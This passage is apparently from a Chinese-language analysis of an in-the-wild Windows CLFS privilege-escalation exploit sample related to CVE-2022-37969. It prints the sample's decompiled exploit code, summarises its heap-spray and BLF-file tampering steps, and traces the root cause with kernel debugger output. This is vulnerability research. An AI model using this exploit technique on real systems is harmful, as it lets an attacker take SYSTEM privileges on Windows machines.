--v43; } while ( v43 ); sub_7FF662E77D93(1i64); __debugbreak(); } ++v55; v56 += 2; } while ( v55 \u0026lt; 0x4000 ); pcbContainer = 512i64; if ( versionFlag ) { v57 = Size; v58 = hObject; v59 = 0; while ( 1 ) { AddLogContainer(*v58, \u0026amp;pcbContainer, (LPWSTR)\u0026amp;v97[256 * (__int64)v59], 0i64); MEMORY[0x5000030] = qword_7FF662B44710; MEMORY[0x5000000] = 0x5001000i64; MEMORY[0x5001000] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001010] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001018] = ClfsEarlierLsnKernelAddress; ...... MEMORY[0x50011F8] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001008] = PoFxProcessorNotificationKernelAddress1; MEMORY[0x5000040] = 83886080i64; MEMORY[0x5000068] = ClfsMgmtDeregisterManagedClientAddress; MEMORY[0x5000048] = 83887104i64; MEMORY[0x5000400] = 83890944i64; MEMORY[0x5000448] = ntap_address+ 24; MEMORY[0x5001328] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001308] = SeSetAccessStateGenericMappingAddressKernelAddr; CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); v80 = 90; NtFsControlFileAddress(hReadPipe[0], 0i64, 0i64, 0i64, v91, 0x110038, \u0026amp;v80, 2, v57, 0x2000); v60 = (unsigned int)system_token_object + (__int64)token_offset; v61 = *(_QWORD *)(v60 + v57 + 8); if ( *(_QWORD *)(v60 + v57) \u0026gt;= 0x8181818181818181ui64 ) break; ...... if ( v59 \u0026gt;= 0xA ) goto LABEL_76; } MEMORY[0xFFFFFFFF] = *(_QWORD *)(v60 + v57); MEMORY[0x100000007] = v61; MEMORY[0x5000448] = current_token - 8; CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); MEMORY[0xFFFFFFFF] = 0x1470i64; MEMORY[0x100000007] = 0i64; MEMORY[0x5000448] = MyLog__08d_base_block + 912; CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); 从这段代码可以明显看到CVE-2022-37969利用的影子，包括布局0x5000000内存，疑似伪造CClfsContainer对象，利用ClfsEarlierLsn、SeSetAccessStateGenericMappingAddress进行任意地址读写，不同的是本次样本中增加了ClfsMgmtDeregisterManagedClient和PoFxProcessorNotification函数。同时和CVE-2022-37969一样的是两次触发了漏洞，分别读取system token和将system token写入到自身token，达成提权。\n同时还注意到，样本集成了利用RtlClearBit进行提权的技术，由一个全局flag控制决定使用哪种方式，其while循环内逻辑和前一种利用方式一样。\nelse { v63 = 0; v64 = hObject; while ( 1 ) { AddLogContainer(*v64, \u0026amp;pcbContainer, (LPWSTR)\u0026amp;v97[256 * (__int64)v63], 0i64); MEMORY[0x5000000] = 0x5001000i64; MEMORY[0x5000030] = qword_7FF662B44710; MEMORY[0x5001008] = ClfsEarlierLsnKernelAddress; ...... MEMORY[0x50011F8] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001000] = ClfsMgmtDeregisterManagedClientAddress; MEMORY[0x5001028] = RtlClearBitKernelAddress; MEMORY[0x5000008] = *(_QWORD *)(addr_array + 48) + *(unsigned int *)(addr_array + 56); CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); v65 = system_TOKEN; system_token_object = 0i64; v66 = *(void (__fastcall **)(__int64, size_t *, __int64, __int64, char *))(addr_array + 16); v67 = sub_7FF662E78B70(); v66(v67, \u0026amp;system_token_object, v65, 8i64, v88); if ( system_token_object \u0026gt;= 0x8181818181818181ui64 ) break; ...... if ( v63 \u0026gt;= 0xA ) goto LABEL_88; } v68 = current_token; Size = system_token_object; v69 = *(void (__fastcall **)(__int64, __int64, size_t *, __int64, char *))(addr_array + 16);// NtWriteVirtualMemory v70 = sub_7FF662E78B70(); v69(v70, v68, \u0026amp;Size, 8i64, v89); v71 = MyLog__08d_base_block; v83 = 5232; v72 = *(void (__fastcall **)(__int64, __int64, int *, __int64, char *))(addr_array + 16); v73 = sub_7FF662E78B70(); v72(v73, v71 + 920, \u0026amp;v83, 4i64, v90); LOBYTE(v80) = 1; v74 = *(_QWORD *)(addr_array + 48) + *(unsigned int *)(addr_array + 56); v75 = *(void (__fastcall **)(__int64, __int64, __int16 *, __int64, char *))(addr_array + 16); v76 = sub_7FF662E78B70(); v75(v76, v74, \u0026amp;v80, 1i64, v91); LABEL_88: ..... v77 = v98; 总结样本利用步骤\n创建一个主blf日志文件，并修改特定偏移的值，而后调用AddLogContainer为其添加容器 调用CreateLogFIle创建十个用于堆布局的副BLF日志文件，并修改特定偏移的值。 分别生成0x5000和0x4000对pipe，首先对0x5000对pipe调用WriteFile写入主blf文件的base block地址+0x30，而后从0x1000对开始释放0x667对pipe，而后调用CreateLogFile，传入的文件名为第二步所用的副blf文件名。 为0x4000对pipe调用WriteFile写入内存，和第三步中写入的一样。 为前面十个副blf文件添加容器。 对主blf日志文件调用CreateLogFile，触发漏洞，一共触发两次，分别完成token的读写。 动态调试\n使用x64dbg调试样本，并使用windbg附加内核调试。在x64dbg中可以看到，样本获取到了system token和自身token地址。\n在windbg中可以看到已经成功获取到了自身token地址和system token地址\n1: kd\u0026gt; !process 16e0 1 Searching for Process with Cid == 16e0 PROCESS ffffcf8bfa9dd180 SessionId: 1 Cid: 16e0 Peb: 2b65a98000 ParentCid: 1cf4 FreezeCount 1 DirBase: a9197000 ObjectTable: ffffa80486c39280 HandleCount: 171. Image: 06248628e1ede80fcc3c36b25.exe VadRoot ffffcf8bfaac8ab0 Vads 86 Clone 0 Private 2360. Modified 5134. Locked 0. DeviceMap ffffa80480c82af0 Token ffffa80486595060 ElapsedTime 00:14:19.644 UserTime 00:00:00.000 KernelTime 00:00:00.000 QuotaPoolUsage[PagedPool] 195352 QuotaPoolUsage[NonPagedPool] 12024 Working Set Sizes (now,min,max) (5527, 50, 345) (22108KB, 200KB, 1380KB) PeakWorkingSetSize 5447 VirtualSize 4247 Mb PeakVirtualSize 4247 Mb PageFaultCount 12131 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 3956 DebugPort ffffcf8bf58da970 Job ffffcf8bf5fd5060 1: kd\u0026gt; dq FFFFCF8BFA9DD638 ffffcf8b`fa9dd638 ffffa804`86595064 00000000`00000000 1: kd\u0026gt; !process 4 1 Searching for Process with Cid == 4 PROCESS ffffcf8bf1695040 SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000 DirBase: 001ad000 ObjectTable: ffffa8047c03ddc0 HandleCount: 2771. Image: System VadRoot ffffcf8bf1dd2da0 Vads 6 Clone 0 Private 22. Modified 335861. Locked 0. DeviceMap ffffa8047c0351e0 Token ffffa8047c04f6e0 ElapsedTime 2 Days 23:05:23.432 UserTime 00:00:00.000 KernelTime 00:07:35.203 QuotaPoolUsage[PagedPool] 0 QuotaPoolUsage[NonPagedPool] 272 Working Set Sizes (now,min,max) (24, 50, 450) (96KB, 200KB, 1800KB) PeakWorkingSetSize 218 VirtualSize 3 Mb PeakVirtualSize 14 Mb PageFaultCount 3280 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 49 1: kd\u0026gt; dq ffffcf8bf16954f8 ffffcf8b`f16954f8 ffffa804`7c04f6e3 00000000`00000000 ffffcf8b`f1695508 00000000`00000000 00000000`00000000 ffffcf8b`f1695518 00000000`00000000 00000000`00000000 ffffcf8b`f1695528 00000000`00000000 00000000`00000000 ffffcf8b`f1695538 00000000`00000016 00000000`00000000 ffffcf8b`f1695548 00000000`00000000 00000000`00000000 ffffcf8b`f1695558 00000000`00000000 00000000`00000000 ffffcf8b`f1695568 00000000`5333eb49 00000000`00000000 而后获取到了各个内核函数地址\n1: kd\u0026gt; u FFFFF80634782B20 CLFS!ClfsEarlierLsn: fffff806`34782b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff806`34785338)] fffff806`34782b27 4885c9 test rcx,rcx fffff806`34782b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62) fffff806`34782b2c 488b09 mov rcx,qword ptr [rcx] fffff806`34782b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff806`34784ec0)] fffff806`34782b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62) fffff806`34782b38 483bc8 cmp rcx,rax fffff806`34782b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62) 在获取到主blf日志文件的base block后通过writefile写入匿名pipe\n1: kd\u0026gt; db FFFFA80488303000 ffffa804`88303000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffa804`88303010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffa804`88303020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffa804`88303030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa804`88303040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa804`88303050 00 00 00 00 00 00 00 00-69 03 00 00 00 00 00 00 ........i....... ffffa804`88303060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... ffffa804`88303070 05 00 00 00 00 00 00 00-80 11 28 07 7e 19 ee 11 ..........(.~... 由于不知道样本修改的文件中哪个部分起到了关键性作用，此时由果追溯原因，样本在伪造的CClfsContainer对象中布局了ClfsEarlierLsn函数地址，在CVE-2022-37969中已经知道该函数是触发漏洞的关键性函数，在ClfsEarlierLsn函数断点，继续运行，调试器断下，此时调用栈如下\n0: kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffa00a`59414fb8 fffff800`53141ba6 CLFS!ClfsEarlierLsn 01 ffffa00a`59414fc0 fffff800`531337e8 CLFS!ClfsMgmtDeregisterManagedClient+0x46 02 ffffa00a`59414ff0 fffff800`5310307f CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174 03 ffffa00a`594150b0 fffff800`53101bf9 CLFS!CClfsLogFcbPhysical::CheckSecureAccess+0x1f 04 ffffa00a`59415100 fffff800`531310c3 CLFS!CClfsLogFcbPhysical::Initialize+0x15d 05 ffffa00a`59415240 fffff800`53132b1b CLFS!CClfsRequest::Create+0x4ef 06 ffffa00a`59415390 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x97 07 ffffa00a`594153e0 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87 08 ffffa00a`59415430 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27 09 ffffa00a`59415460 fffff800`55c96ad4 nt!IofCallDriver+0x55 0a ffffa00a`594154a0 fffff800`560a775d nt!IoCallDriverWithTracing+0x34 0b ffffa00a`594154f0 fffff800`5608f68e nt!IopParseDevice+0x117d 0c ffffa00a`59415660 fffff800`560ba3da nt!ObpLookupObjectName+0x3fe 0d ffffa00a`59415830 fffff800`560c999f nt!ObOpenObjectByNameEx+0x1fa 0e ffffa00a`59415960 fffff800`560c9579 nt!IopCreateFile+0x40f 0f ffffa00a`59415a00 fffff800`55e0d8f5 nt!NtCreateFile+0x79 10 ffffa00a`59415a90 00007ffd`9160db64 nt!KiSystemServiceCopyEnd+0x25 11 00000077`5eafb898 00007ffd`8c382199 ntdll!NtCreateFile+0x14 12 00000077`5eafb8a0 00007ff7`ecad416a clfsw32!CreateLogFile+0x679 13 00000077`5eafba40 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x416a 14 00000077`5eaffca0 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c 15 00000077`5eaffce0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14 16 00000077`5eaffd10 00000000`00000000 ntdll!RtlUserThreadStart+0x21 样本中对应的伪代码如下，在调用CreateLogFile时触发了漏洞，调用ClfsEarlierLsn函数。\nMEMORY[0x50011E0] = ClfsEarlierLsnKernelAddress; MEMORY[0x50011E8] = ClfsEarlierLsnKernelAddress; MEMORY[0x50011F0] = ClfsEarlierLsnKernelAddress; MEMORY[0x50011F8] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001000] = ClfsMgmtDeregisterManagedClientAddress; MEMORY[0x5001028] = RtlClearBitKernelAddress; MEMORY[0x5000008] = *(_QWORD *)(addr_array + 48) + *(unsigned int *)(addr_array + 56); CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); v65 = system_TOKEN; system_token_object = 0i64; v66 = *(void (__fastcall **)(__int64, size_t *, __int64, __int64, char *))(addr_array + 16); v67 = sub_7FF662E78B70(); v66(v67, \u0026amp;system_token_object, v65, 8i64, v88); if ( system_token_object \u0026gt;= 0x8181818181818181ui64 ) 根据调用栈，再除去布局的函数之外，最后调用的是CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174\nfffff800`531337d4 488bf9 mov rdi, rcx fffff800`531337d7 48894c2450 mov qword ptr [rsp+50h], rcx fffff800`531337dc 488b01 mov rax, qword ptr [rcx] fffff800`531337df 488b00 mov rax, qword ptr [rax] **fffff800`531337e2 ff15001effff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800531255e8)]** fffff800`531337e8 4c8d4c2448 lea r9, [rsp+48h] 同时调试器中可以看到rcx指向的对象位于0x5000000，同时对象内的函数指针指向了ClfsEarlierLsn，和调试过程中的一致。\n0: kd\u0026gt; rrcx rcx=0000000005000000 0: kd\u0026gt; dq rcx 00000000`05000000 00000000`05001000 ffffa289`14aec2b2 00000000`05000010 00000000`00000000 00000000`00000000 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 ffffa289`17764520 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq 00000000`05001000 00000000`05001000 fffff800`53141b60 fffff800`53112b20 00000000`05001010 fffff800`53112b20 fffff800`53112b20 00000000`05001020 fffff800`53112b20 fffff800`55c2c640 00000000`05001030 fffff800`53112b20 fffff800`53112b20 00000000`05001040 fffff800`53112b20 fffff800`53112b20 00000000`05001050 fffff800`53112b20 fffff800`53112b20 00000000`05001060 fffff800`53112b20 fffff800`53112b20 00000000`05001070 fffff800`53112b20 fffff800`53112b20 0: kd\u0026gt; u fffff800`53112b20 CLFS!ClfsEarlierLsn: fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)] fffff800`53112b27 4885c9 test rcx,rcx fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx] fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)] fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b38 483bc8 cmp rcx,rax fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) 根据CClfsBaseFilePersisted::CheckSecureAccess的伪代码，可知触发漏洞的错误对象来自于CClfsBaseFile::GetSymbol，并且其类型为_CLFS_CONTAINER_CONTEXT 对象指针。\nSymbol = CClfsBaseFile::GetSymbol(a1, v14, v12, \u0026amp;v25);// 获取到错误对象 v17 = Symbol; if ( Symbol \u0026lt; 0 ) goto LABEL_21; v15 = (void (__fastcall ***)(_QWORD))*((_QWORD *)v25 + 3); if ( v15 ) { v20 = (struct CClfsContainer *)*((_QWORD *)v25 + 3);// 调用函数指针 v7 = v20; __int64 __fastcall CClfsBaseFile::GetSymbol( PERESOURCE *this, unsigned int a2, int a3, struct _CLFS_CONTAINER_CONTEXT **a4) { ..... v6 = a2; v8 = 0; v17 = 0; if ( a2 \u0026lt; 0x1368 ) return 3222929421i64; *a4 = 0i64; ExAcquireResourceSharedLite(this[4], 1u); if ( !CClfsBaseFile::IsValidOffset((CClfsBaseFile *)this, v6 + 47) ) goto LABEL_15; CClfsBaseFile::GetBaseLogRecord((CClfsBaseFile *)this); v18[0] = 0; if ( (int)ULongAdd(v6, *(_DWORD *)(v11 + 40), (unsigned int *)v18) \u0026lt; 0 || !v12 || v18[0] \u0026gt;= (unsigned int)(*(unsigned __int16 *)(v13 + 4) \u0026lt;\u0026lt; 9) || !(v12 + v6) ) { goto LABEL_15; } if ( *(_DWORD *)(v12 + v6 - 12) != (_DWORD)v6 ) { v8 = -1073741816; LABEL_16: v17 = v8; goto LABEL_17; } v14 = ClfsQuadAlign(0x30u); if ( *(_DWORD *)(v15 - 16) != (unsigned __int64)(v16 + v14) || *(_DWORD *)v15 != -1040322552 || *(_DWORD *)(v15 + 4) != 48 || *(_DWORD *)(v15 + 16) != a3 ) { LABEL_15: v8 = -1072037875; goto LABEL_16; } *a4 = (struct _CLFS_CONTAINER_CONTEXT *)v15; ...... return v8; } PAGE:00000001C00346FE 8B FA mov edi, edx ...... PAGE:00000001C0034766 E8 B5 00 00 00 call ?GetBaseLogRecord@CClfsBaseFile@@IEAAPEAU_CLFS_BASE_RECORD_HEADER@@XZ ; CClfsBaseFile::GetBaseLogRecord(void) PAGE:00000001C0034766 PAGE:00000001C003476B ; 28: v18[0] = 0; PAGE:00000001C003476B 4C 8B C8 mov r9, rax PAGE:00000001C003476E 89 5C 24 24 mov [rsp+48h+var_24], ebx PAGE:00000001C0034772 ; 29: if ( (int)ULongAdd(v6, *(_DWORD *)(v11 + 40), (unsigned int *)v18) \u0026lt; 0 PAGE:00000001C0034772 ; 30: || !v12 PAGE:00000001C0034772 ; 31: || v18[0] \u0026gt;= (unsigned int)(*(unsigned __int16 *)(v13 + 4) \u0026lt;\u0026lt; 9) PAGE:00000001C0034772 ; 32: || !(v12 + v6) ) PAGE:00000001C0034772 4C 8D 44 24 24 lea r8, [rsp+48h+var_24] PAGE:00000001C0034777 41 8B 53 28 mov edx, [r11+28h] PAGE:00000001C003477B 8B CF mov ecx, edi PAGE:00000001C003477D E8 1E 7D FD FF call ?ULongAdd@@YAJKKPEAK@Z ; ULongAdd(ulong,ulong,ulong *) PAGE:00000001C003477D PAGE:00000001C0034782 85 C0 test eax, eax PAGE:00000001C0034784 78 5B js short loc_1C00347E1 PAGE:00000001C0034784 PAGE:00000001C0034786 4D 85 C9 test r9, r9 PAGE:00000001C0034789 74 56 jz short loc_1C00347E1 PAGE:00000001C0034789 PAGE:00000001C003478B 41 0F B7 43 04 movzx eax, word ptr [r11+4] PAGE:00000001C0034790 C1 E0 09 shl eax, 9 PAGE:00000001C0034793 39 44 24 24 cmp [rsp+48h+var_24], eax PAGE:00000001C0034797 73 48 jnb short loc_1C00347E1 PAGE:00000001C0034797 PAGE:00000001C0034799 ; 34: goto LABEL_15; PAGE:00000001C0034799 48 8B D7 mov rdx, rdi PAGE:00000001C003479C 49 03 D1 add rdx, r9 ...... PAGE:00000001C00347DC 49 89 16 mov [r14], rdx 根据伪代码和汇编可知最终a4的值由rdx+r9，r9来自于GetBaseLogRecord函数返回值，是一个固定值，rdx是CClfsBaseFile::GetSymbol的第二个参数，需要注意的是要将值赋给a4需要满足if语句中的条件，可以看到对应于在主blf文件修改的几个值。\n在CClfsBaseFilePersisted::CheckSecureAccess中，GetSymbol的第二个参数为BaseLogRecord+0x328，对应于rgContainers数组。\nBaseLogRecord = CClfsBaseFile::GetBaseLogRecord((CClfsBaseFile *)a1); v26 = BaseLogRecord; if ( !BaseLogRecord ) { LABEL_20: Symbol = -1072037875; v17 = -1072037875; goto LABEL_21; } v12 = 0i64; v24 = 0; v13 = 0; v23 = 0; while ( v13 \u0026lt; v11 \u0026amp;\u0026amp; (unsigned int)v12 \u0026lt; 0x400 ) { v14 = *((_DWORD *)BaseLogRecord + v12 + 0xCA); if ( v14 ) { Symbol = CClfsBaseFile::GetSymbol(a1, v14, v12, \u0026amp;v25);// 获取到错误对象 在内存中可以看到其值为0x1570\n0: kd\u0026gt; db ffffe381`a86d7070 + 0x328 ffffe381`a86d7398 70 15 00 00 00 00 00 00-00 00 00 00 00 00 00 00 p............... ffffe381`a86d73a8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 根据代码逻辑GetSymbol会根据BaseLogRecord+0x1570定位container context对象并尝试调用pContainer成员的指针，container context如下：\n0: kd\u0026gt; dq ffffe381`a86d7070 + 0x1570 ffffe381`a86d85e0 00000030`c1fdf008 00000000`00000000 ffffe381`a86d85f0 00000000`00000000 00000000`05000000 0: kd\u0026gt; dps 00000000`05000000 00000000`05000000 00000000`05001000 00000000`05000008 ffffa289`14aec2b2 00000000`05000010 00000000`00000000 00000000`05000018 00000000`00000000 00000000`05000020 00000000`00000000 00000000`05000028 00000000`00000000 00000000`05000030 ffffa289`17764520 00000000`05000038 00000000`00000000 00000000`05000040 00000000`00000000 00000000`05000048 00000000`00000000 00000000`05000050 00000000`00000000 00000000`05000058 00000000`00000000 00000000`05000060 00000000`00000000 00000000`05000068 00000000`00000000 00000000`05000070 00000000`00000000 00000000`05000078 00000000`00000000 0: kd\u0026gt; dq 00000000`05001000 00000000`05001000 fffff800`53141b60 fffff800`53112b20 00000000`05001010 fffff800`53112b20 fffff800`53112b20 00000000`05001020 fffff800`53112b20 fffff800`55c2c640 00000000`05001030 fffff800`53112b20 fffff800`53112b20 00000000`05001040 fffff800`53112b20 fffff800`53112b20 00000000`05001050 fffff800`53112b20 fffff800`53112b20 00000000`05001060 fffff800`53112b20 fffff800`53112b20 00000000`05001070 fffff800`53112b20 fffff800`53112b20 0: kd\u0026gt; u fffff800`53141b60 CLFS!ClfsMgmtDeregisterManagedClient: fffff800`53141b60 48895c2408 mov qword ptr [rsp+8],rbx fffff800`53141b65 57 push rdi fffff800`53141b66 4883ec20 sub rsp,20h fffff800`53141b6a 488bd9 mov rbx,rcx fffff800`53141b6d 4885c9 test rcx,rcx fffff800`53141b70 0f841ae50000 je CLFS!ClfsMgmtDeregisterManagedClient+0xe530 (fffff800`53150090) fffff800`53141b76 4c8b150335feff mov r10,qword ptr [CLFS!_imp_KeEnterCriticalRegion (fffff800`53125080)] fffff800`53141b7d e8ae5eb302 call nt!KeEnterCriticalRegion (fffff800`55c77a30) 0: kd\u0026gt; u fffff800`53112b20 CLFS!ClfsEarlierLsn: fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)] fffff800`53112b27 4885c9 test rcx,rcx fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx] fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)] fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b38 483bc8 cmp rcx,rax fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) 调用pContainer的函数指针汇编如下\nPAGE:00000001C00337AF E8 2C 0F 00 00 call ?GetSymbol@CClfsBaseFile@@QEAAJJKPEAPEAU_CLFS_CONTAINER_CONTEXT@@@Z ; CClfsBaseFile::GetSymbol(long,ulong,_CLFS_CONTAINER_CONTEXT * *) PAGE:00000001C00337AF PAGE:00000001C00337B4 8B D8 mov ebx, eax PAGE:00000001C00337B6 ; 66: v17 = Symbol; PAGE:00000001C00337B6 89 44 24 40 mov [rsp+0B8h+var_78], eax PAGE:00000001C00337BA ; 67: if ( Symbol \u0026lt; 0 ) PAGE:00000001C00337BA 85 C0 test eax, eax PAGE:00000001C00337BC ; 68: goto LABEL_21; PAGE:00000001C00337BC 0F 88 F1 00 00 00 js loc_1C00338B3 PAGE:00000001C00337BC PAGE:00000001C00337C2 ; 69: v15 = (void (__fastcall ***)(_QWORD))*((_QWORD *)v25 + 3); PAGE:00000001C00337C2 48 8B 44 24 70 mov rax, [rsp+0B8h+var_48] PAGE:00000001C00337C7 48 8B 48 18 mov rcx, [rax+18h] PAGE:00000001C00337CB ; 70: if ( v15 ) PAGE:00000001C00337CB 48 85 C9 test rcx, rcx PAGE:00000001C00337CE 0F 84 EB 00 00 00 jz loc_1C00338BF PAGE:00000001C00337CE PAGE:00000001C00337D4 ; 73: v7 = v20; PAGE:00000001C00337D4 48 8B F9 mov rdi, rcx PAGE:00000001C00337D7 ; 72: v20 = (struct CClfsContainer *)*((_QWORD *)v25 + 3);// 调用函数指针 PAGE:00000001C00337D7 48 89 4C 24 50 mov [rsp+0B8h+var_68], rcx PAGE:00000001C00337DC ; 74: (**v15)(v15); PAGE:00000001C00337DC 48 8B 01 mov rax, [rcx] PAGE:00000001C00337DF 48 8B 00 mov rax, [rax] PAGE:00000001C00337E2 FF 15 00 1E FF FF call cs:__guard_dispatch_icall_fptr pContainer指向的对象的第一个函数指针指向了ClfsMgmtDeregisterManagedClient，该函数会调用rcx+0x28和rcx+0x8的函数指针。\nNTSTATUS __stdcall ClfsMgmtDeregisterManagedClient(CLFS_MGMT_CLIENT ClientCookie) { NTSTATUS v2; // edi if ( !ClientCookie ) return -1073741811; KeEnterCriticalRegion(); v2 = (*(__int64 (__fastcall **)(CLFS_MGMT_CLIENT, _QWORD))(*(_QWORD *)ClientCookie + 0x28i64))(ClientCookie, 0i64); (*(void (__fastcall **)(CLFS_MGMT_CLIENT))(*(_QWORD *)ClientCookie + 8i64))(ClientCookie); KeLeaveCriticalRegion(); return v2; } 而rcx指向了0x501000，在内存布局中rcx+0x28和rcx+0x8分别指向了RtlClearBit和ClfsEarlierLsn函数。\n回溯触发过程，容易得出结论，漏洞利用的核心是rgContainers数组被修改导致定位到了错误的container context，在正常文件中rgContainers处偏移为0x1470，在触发漏洞时，该值被修改为了0x1570。错误的container context由攻击者控制，从而控制到了CClfsContainer对象，导致调用了错误的函数指针。\n再次调试，在主blf文件的baselogrecord+0x328位置处下写断点。运行样本。在CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a处断下。\n1: kd\u0026gt; ba w2 FFFFE381A2303000+0x398 0: kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffa00a`57e30340 fffff800`531519cf CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a 01 ffffa00a`57e303d0 fffff800`5312b839 CLFS!CClfsBaseFilePersisted::ExtendMetadataBlock+0x423 02 ffffa00a`57e304a0 fffff800`5312ccbc CLFS!CClfsBaseFilePersisted::AddSymbol+0x10d 03 ffffa00a`57e30520 fffff800`5312b3e6 CLFS!CClfsBaseFilePersisted::AddContainer+0xdc 04 ffffa00a`57e305d0 fffff800`53154845 CLFS!CClfsLogFcbPhysical::AllocContainer+0x136 05 ffffa00a`57e30670 fffff800`53132dd5 CLFS!CClfsRequest::AllocContainer+0x27d 06 ffffa00a`57e30730 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x351 07 ffffa00a`57e30780 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87 08 ffffa00a`57e307d0 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27 09 ffffa00a`57e30800 fffff800`560a6048 nt!IofCallDriver+0x55 0a ffffa00a`57e30840 fffff800`560a5e47 nt!IopSynchronousServiceTail+0x1a8 0b ffffa00a`57e308e0 fffff800`560a51c6 nt!IopXxxControlFile+0xc67 0c ffffa00a`57e30a20 fffff800`55e0d8f5 nt!NtDeviceIoControlFile+0x56 0d ffffa00a`57e30a90 00007ffd`9160d1a4 nt!KiSystemServiceCopyEnd+0x25 0e 0000009e`74b1b448 00007ffd`8f0c572b ntdll!NtDeviceIoControlFile+0x14 0f 0000009e`74b1b450 00007ffd`900c5bf1 KERNELBASE!DeviceIoControl+0x6b 10 0000009e`74b1b4c0 00007ffd`7e4a2895 KERNEL32!DeviceIoControlImplementation+0x81 11 0000009e`74b1b510 00007ffd`7e4a245c clfsw32!AddLogContainerSet+0x425 12 0000009e`74b1b5f0 00007ff7`ecad3e82 clfsw32!AddLogContainer+0x3c 13 0000009e`74b1b630 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x3e82 14 0000009e`74b1f890 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c 15 0000009e`74b1f8d0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14 16 0000009e`74b1f900 00000000`00000000 ntdll!RtlUserThreadStart+0x21 对应的汇编指令为\nfffff800`53134276 4aff0430 inc qword ptr [rax+r14] 在样本中为循环给创建的10个副blf文件添加日志容器\n在CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a函数中对应位置伪代码及汇编如下：\n从this+0x30处取指针并解引用，而后访问指针指向的内存偏移24*a2的位置，将该处作为指针赋给v8，v8内存位置偏移0x28后作为指针并解引用赋给v10，v10和v8相加并解引用后自增1\n__int64 __fastcall CClfsBaseFilePersisted::WriteMetadataBlock(CClfsBaseFilePersisted *this, unsigned int a2, char a3) { __int64 v4; // rsi unsigned int v6; // ebx char v7; // r12 __int64 v8; // r14 int v9; // r15d __int64 v10; // rax __int64 v11; // r9 __int64 v12; // rdx unsigned int i; // esi char *v14; // rdx struct _CLFS_CONTAINER_CONTEXT *v15; // rcx _QWORD *v16; // rsi unsigned int v18; // [rsp+34h] [rbp-54h] int v19; // [rsp+34h] [rbp-54h] unsigned int v20; // [rsp+3Ch] [rbp-4Ch] BYREF struct _CLFS_CONTAINER_CONTEXT *v21; // [rsp+40h] [rbp-48h] BYREF __int64 v22; // [rsp+48h] [rbp-40h] BYREF __int64 v23; // [rsp+50h] [rbp-38h] BOOLEAN v24; // [rsp+A8h] [rbp+20h] v4 = a2; v6 = 0; v23 = 0i64; v21 = 0i64; v7 = 0; v24 = 